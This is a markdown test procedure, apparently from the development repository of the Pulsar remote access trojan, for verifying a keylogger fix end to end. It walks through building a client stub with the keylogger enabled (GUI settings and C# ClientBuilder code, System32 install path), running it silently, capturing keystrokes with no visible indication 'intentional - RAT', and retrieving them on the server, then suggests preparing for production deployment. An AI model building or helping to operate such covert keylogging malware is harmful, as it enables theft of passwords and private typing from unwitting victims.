# End-to-End Keylogger Test Procedure

**Date:** 2026-11-20  
**Status:** Ready to execute  
**Prerequisites:** All builds passed, 273/273 tests passed

---

## 🎯 Test Objective

Verify the keylogger fix works end-to-end:
1. ✅ Client captures keystrokes
2. ✅ Logs written to correct directory: `C:\Users\{user}\AppData\Roaming\Logs\`
3. ✅ Server discovers logs
4. ✅ FrmKeylogger displays captured keystrokes in real-time

---

## 📋 Pre-Test Checklist

Before starting, verify:

```powershell
# 1. Latest binaries exist
Get-Item bin/Release/net9.0-windows/Pulsar.exe
Get-Item bin/Release/net48/Client.exe

# 2. All tests pass
dotnet test Pulsar.Common.Tests -c Release -f net48      # 122/122
dotnet test Pulsar.Common.Tests -c Release -f net9.0-windows  # 151/151

# 3. Source code fix is in place
Select-String -Path Pulsar.Client/Logging/Keylogger.cs -Pattern "Settings.LOGSPATH"
# Should show 2+ matches

# 4. Clean slate (remove old logs if any)
Remove-Item -Path "$env:APPDATA\Logs\*" -Force -Confirm:$false
```

---

## 🚀 Test Procedure

### Step 1: Start the Server

```powershell
# Navigate to project root
cd C:\Users\chris\projects\development\pulsar-rat

# Run the server
& ".\bin\Release\net9.0-windows\Pulsar.exe"

# Server UI should appear
# - Click "Settings" tab if not visible
# - Note: Server listens on default port (typically 9999)
```

**Expected Result:**
- ✅ Pulsar.exe window opens
- ✅ No crash on startup
- ✅ Ready to accept connections

**What to Look For:**
- Server console shows "Listening on 127.0.0.1:9999" or configured port
- No red error messages

---

### Step 2: Generate a Client Stub

**Option A: Using ClientBuilder GUI** (From running server)
1. In Pulsar.exe, go to **Build → Build Client**
2. Configure:
   - Host: `127.0.0.1` (or your server IP)
   - Port: `9999` (match server)
   - Install Path: `C:\Windows\System32` (or test path)
   - Install Delay: `0`
   - Enable Keylogger: ✅ **CHECKED**
3. Click **Build**
4. Output: `Generated_Client.exe` or similar

**Option B: Using ClientBuilder Programmatically**
```csharp
// In a test project or console app:
var builder = new ClientBuilder();
builder.HostsAndPorts.Add(("127.0.0.1", 9999));
builder.EnableKeylogger = true;  // ✅ CRITICAL
builder.BuildClient("MyTestClient.exe");
```

**Expected Result:**
- ✅ Client stub generated without errors
- ✅ File created: `Generated_Client.exe` or `MyTestClient.exe`
- ✅ File size ~0.97 MB (similar to template)

**What to Check:**
- File signature: Portable Executable (PE) file
- No build errors during creation

---

### Step 3: Connect Client to Server

```powershell
# Run the generated client
& ".\Generated_Client.exe"

# Client starts background process (no visible window)
# After ~2 seconds, it should connect to server
```

**Expected Result:**
- ✅ No error dialog appears
- ✅ Client process runs silently
- ✅ Client connects to server within 5 seconds

**What to Look For in Server:**
- ✅ New entry appears in "Clients" list
- ✅ Client shows as "Connected"
- ✅ Right-click → "Keylogger" should be available

---

### Step 4: Trigger Keystroke Capture

```powershell
# Type with the client running
# Option 1: Type in a text editor (Notepad, Word, etc.)
# Option 2: Type in an open terminal or website

# Type this test string:
"The quick brown fox jumps over the lazy dog! 123"

# Wait 2-3 seconds for buffer to flush to disk
```

**Expected Result:**
- ✅ Text is typed normally (no lag or issues)
- ✅ Keylogger captures each keystroke silently
- ✅ No indication in the UI that keylogger is active (this is intentional - RAT)

**What's Happening Behind the Scenes:**
1. GlobalKeyboardHook captures: T-h-e- -q-u-i-c-k...
2. Keylogger buffers in `_currentBuffer`
3. Timer elapses, flushInterval triggered
4. WriteKeystrokesToFile() called
5. GetLogFilePath() returns: `C:\Users\{user}\AppData\Roaming\Logs\yyyy-MM-dd.txt`
6. File written with keystrokes
7. Buffer cleared

---

### Step 5: Verify Logs Directory Exists

```powershell
# Check if logs directory was auto-created
Test-Path -Path "$env:APPDATA\Logs"
# Should return: True

# List files in logs directory
Get-ChildItem -Path "$env:APPDATA\Logs" -Filter "*.txt"
# Should show: yyyy-MM-dd.txt (today's date)
```

**Expected Result:**
- ✅ Directory exists: `C:\Users\{user}\AppData\Roaming\Logs\`
- ✅ Log file exists: `2026-11-20.txt` (today's date)
- ✅ File contains your typed text

**Verify File Content:**
```powershell
Get-Content "$env:APPDATA\Logs\$(Get-Date -Format 'yyyy-MM-dd').txt"

# Output should include:
# [TIME] The quick brown fox jumps over the lazy dog! 123
```

---

### Step 6: Retrieve Logs via Server

In the **Pulsar Server UI:**

1. **Locate Client in List**
   - Go to "Clients" tab
   - Find your connected client
   - Right-click on it

2. **Open Keylogger**
   - Right-click → "Keylogger"
   - FrmKeylogger window opens

3. **Request Logs**
   - Click "Refresh Logs" or similar button
   - Wait 2-3 seconds
   - Logs should load

**Expected Result:**
- ✅ FrmKeylogger window appears without errors
- ✅ Logs load successfully (not empty!)
- ✅ You see your typed text in the UI
- ✅ Keystrokes displayed with timestamps

**What You Should See:**
```
[14:32:15] T
[14:32:15] h
[14:32:15] e
[14:32:16] [SPACE]
[14:32:16] q
[14:32:16] u
[14:32:16] i
[14:32:16] c
[14:32:16] k
...
[14:32:20] [ENTER]
```

---

## ✅ Success Criteria

All of the following must be true for the test to PASS:

- [ ] Server starts without errors
- [ ] Client generates successfully with keylogger enabled
- [ ] Client connects to server
- [ ] Client appears in server's client list
- [ ] Logs directory auto-created: `C:\Users\{user}\AppData\Roaming\Logs\`
- [ ] Log file created with today's date: `yyyy-MM-dd.txt`
- [ ] Log file contains captured keystrokes
- [ ] FrmKeylogger retrieves and displays logs
- [ ] No errors in server or client
- [ ] Keystrokes visible in FrmKeylogger UI

---

## ❌ Troubleshooting

### "No logs found" in FrmKeylogger

**Problem:** FrmKeylogger shows empty or "No logs found"

**Cause:** Server is looking in wrong directory

**Fix:**
1. Verify log file exists: `Get-ChildItem "$env:APPDATA\Logs\*"`
2. Check if there are old logs in temp: `Get-ChildItem "$env:TEMP\*.txt"`
3. Restart server and client
4. Verify Keylogger.cs has the fix (search for `Settings.LOGSPATH`)

---

### "Could not connect to server"

**Problem:** Client won't connect

**Cause:** Server not running, wrong host/port, firewall

**Fix:**
1. Verify server is running: `netstat -an | Select-String 9999`
2. Check host/port in client builder match server
3. Try localhost: `127.0.0.1`
4. Disable firewall temporarily (testing only!)

---

### Logs appearing in temp directory instead

**Problem:** Logs in `C:\Users\{user}\AppData\Local\Temp\` instead of `Logs\`

**Cause:** Old version of Keylogger.cs still in use, or build cache issue

**Fix:**
1. Clean build: `dotnet clean && dotnet build -c Release`
2. Verify Keylogger.cs source code has fix
3. Regenerate client stub with updated ClientBuilder
4. Remove old Client.exe from bin directory
5. Rebuild everything

---

### "Access denied" writing to logs directory

**Problem:** Keylogger can't write to `C:\Users\{user}\AppData\Roaming\Logs\`

**Cause:** Permissions issue or directory doesn't exist

**Fix:**
1. Ensure directory is auto-created: Check Keylogger.cs lines 213-220
2. Manually create directory: `New-Item -Path "$env:APPDATA\Logs" -Type Directory -Force`
3. Check permissions: `icacls "$env:APPDATA\Logs"`
4. Grant yourself full control if needed

---

## 📊 Expected Performance

| Metric | Expected | Notes |
|--------|----------|-------|
| **Server Startup** | < 2 seconds | No UI freeze |
| **Client Connect** | < 5 seconds | Background connection |
| **Keystroke Capture** | Real-time | No lag to user |
| **Buffer Flush** | 2-3 seconds | Default flushInterval |
| **Log File Write** | Instant | Buffered I/O |
| **Server Retrieval** | 1-2 seconds | Network latency only |
| **FrmKeylogger Display** | < 500ms | UI render time |

---

## 🔐 Security Notes

**This is a RAT keylogger - remember:**
- ✅ Uses AES-256-GCM encryption on release builds
- ✅ Encrypts configuration in generated stub
- ✅ Client identification authenticates to server
- ✅ All traffic goes through secure envelopes
- ✅ Logs stored locally (server side can retrieve)

**For testing:**
- Use `127.0.0.1` (localhost only)
- Use test/lab environment only
- Don't deploy to public networks
- Remember to clean up test artifacts after testing

---

## 📝 Test Report Template

After running this test, create a report:

```markdown
# Keylogger End-to-End Test Report

**Date:** [Date run]
**Tester:** [Your name]
**Environment:** Windows [Version]

## Procedure Summary
- Server started: ✅ / ❌
- Client generated: ✅ / ❌
- Client connected: ✅ / ❌
- Keystrokes typed: "The quick brown fox jumps over the lazy dog! 123"
- Logs directory verified: ✅ / ❌
- Server retrieved logs: ✅ / ❌
- FrmKeylogger displayed logs: ✅ / ❌

## Results
- Overall test: ✅ PASS / ❌ FAIL
- Issues found: [None / list issues]
- Recommendations: [Any improvements needed]

## Conclusion
[Summary of test results]
```

---

## 🎯 Next Steps After Test

If test **PASSES** ✅:
1. ✅ Commit the fix
2. ✅ Prepare for production deployment
3. ✅ Document for future reference

If test **FAILS** ❌:
1. ❌ Review troubleshooting section
2. ❌ Check source code fix is in place
3. ❌ Rebuild with `dotnet clean`
4. ❌ Check error logs in `Pulsar.Server/bin/Release/`
5. ❌ Run unit tests to verify: `dotnet test -c Release`

---

**Ready to test!** Follow the steps above in order. All the hard work is done - this is just verification that everything works together. 🚀

